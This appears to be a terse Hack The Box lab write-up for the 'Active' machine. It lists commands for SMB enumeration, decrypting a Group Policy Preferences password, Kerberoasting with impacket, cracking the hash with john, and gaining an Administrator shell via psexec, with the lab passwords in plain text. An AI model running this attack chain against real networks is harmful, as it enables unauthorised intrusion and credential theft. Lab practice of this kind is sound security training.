Active
========================

    sudo nmap_enum active.htb | tee nmap_output.txt

Aqui sossegado:

    smbclient -L //10.10.10.100
    smbclient //10.10.10.100/Replication -c 'recurse true; ls'
    
![qownnotes-media-vtsXyC](../../../media/qownnotes-media-vtsXyC.png)

    smbclient //10.10.10.100/Replication
    cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
    get Groups.xml

# Exploitation

    gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ


![qownnotes-media-jysviZ](../../../media/qownnotes-media-jysviZ.png)

    impacket-psexec active.htb/SVC_TGS:GPPstillStandingStrong2k18@10.10.10.100
    
    impacket-GetNPUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

# Privilege Escalation
    
    impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
    
![qownnotes-media-tKQdxa](../../../media/qownnotes-media-tKQdxa.png)

![qownnotes-media-qApPLP](https://github.com/alisonocosta/InfraHacking/blob/main/.gitbook/assets/qownnotes-media-qApPLP.png)

    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    
    impacket-psexec 'active.htb/Administrator:Ticketmaster1968@10.10.10.100'
    

![qownnotes-media-LCzGOy](https://github.com/alisonocosta/InfraHacking/tree/main/.gitbook/assets/qownnotes-media-LCzGOy.png)